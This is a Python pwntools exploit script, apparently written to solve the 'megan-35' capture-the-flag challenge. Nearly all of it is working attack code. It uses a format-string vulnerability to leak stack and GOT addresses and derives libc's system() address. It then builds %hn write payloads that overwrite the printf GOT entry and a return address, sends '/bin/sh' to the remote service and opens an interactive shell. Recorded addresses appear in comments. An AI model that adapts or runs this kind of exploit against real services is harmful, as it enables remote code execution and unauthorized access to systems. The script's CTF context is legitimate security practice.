#!/usr/bin/env python

from pwn import *
import time
import base64
import binascii

pwnlib.args.SILENT(1)    # disable pwn console log text
print 'Preparing payload ...\n'

m35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
dic = dict(zip(b64, m35))

def m35encode(s):
    return ''.join([dic[x] for x in base64.b64encode(s)])

# s = process('./megan-35')
# nc megan35.stillhackinganyway.nl 3535
# s = remote('megan35.stillhackinganyway.nl', 3535)

def leakStack():
    result = ""
    for i in range(1, 100):
        s = process('./megan-35')
        #s = remote('megan35.stillhackinganyway.nl', 3535)
        p = 'AAAA.%' + str(i) + '$x'
        s.sendline(m35encode(p))
        result += s.recvall()
    print result
            
def findParamPosition():
    for i in range(1, 100):
        s = remote('megan35.stillhackinganyway.nl', 3535)
        #s = process('./megan-35')
        p = 'AAAA.%' + str(i) + '$x'
        s.sendline(m35encode(p))
        res = s.recvall()
        if '41414141' in res:
            print 'found 41414141 at', i,'th place'
            break

def get68thAddress():
    s = remote('megan35.stillhackinganyway.nl', 3535)
    #s = process('./megan-35')
    p = 'AAAA.%68$p'
    s.sendline(m35encode(p))
    result = s.recvall()
    result = int(result.split('.')[-1], 16)
    #print '68th address =', result
    return result

def readAddrAtAddr(addr):
    s = remote('megan35.stillhackinganyway.nl', 3535)
    #s = process('./megan-35')
    s.recvuntil('encryption.\n')
    p = p32(addr) + "%p"*70 + ".%s"
    s.sendline(m35encode(p))
    result = s.recvall()
    #print result
    result = int(result.split('.')[-1][:4][::-1].encode('hex'),16)
    return result


#findParamPosition()  # found 41414141 at 71 th place
leakStack()

# gdb start
# i r $eip = 0x80484e0 
main_addr = 0x80484e0
# objdump -R ./megan-35
# 0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
printf_got = 0x0804a00c

libc = ELF('libc.so.6')
loaded_printf_addr = readAddrAtAddr(printf_got)
printf_offset = libc.symbols['printf']
libc.address = loaded_printf_addr - printf_offset
system_addr = libc.symbols['system']
#saw in debbugger that 68th address got value = return_addr - 0xe8
return_addr = get68thAddress() + 0xe8

print ('main_addr = 0x%x'% main_addr)
print ('printf_got = 0x%x'% printf_got)
print ('printf_addr = 0x%x'% loaded_printf_addr)
print ('system_addr = 0x%x'% system_addr)
print ('return_addr = 0x%x'% return_addr)

# printf_addr = 0xf7e62020
# system_addr = 0xf7e53940
# bin_sh_addr = 0xf7f7200b
# return_addr = 0xffffddcc
# printf_got = 0x0804a00c
# main_addr = 0x80484e0

# printf_got -> system_addr
# 0x0804a00c -> 0xf7e53940 (63461 | 14656)
# 0xffffddcc -> 0x80484e0  (2052  | 34016)
# return_addr -> main_addr

#         71 lower_sys       + 72 higher_sys      + 73 lower_main  + 74 higer_main  
payload = p32(printf_got) + p32(printf_got + 2) + p32(return_addr) + p32(return_addr + 2)
payload += '%' + str(2052 - 16) + 'x%74$hn'
payload += '%' + str(14656 - 2052) + 'x%71$hn'
payload += '%' + str(34016 - 14656) + 'x%73$hn'
payload += '%' + str(63461 - 34016) + 'x%72$hn'


print '\nSending payload ...'
s = remote('megan35.stillhackinganyway.nl', 3535)
s.sendline(m35encode(payload))
s.clean(timeout=1)
s.sendline(m35encode('/bin/sh\x00'))
print 'Done!\n'
s.interactive()



































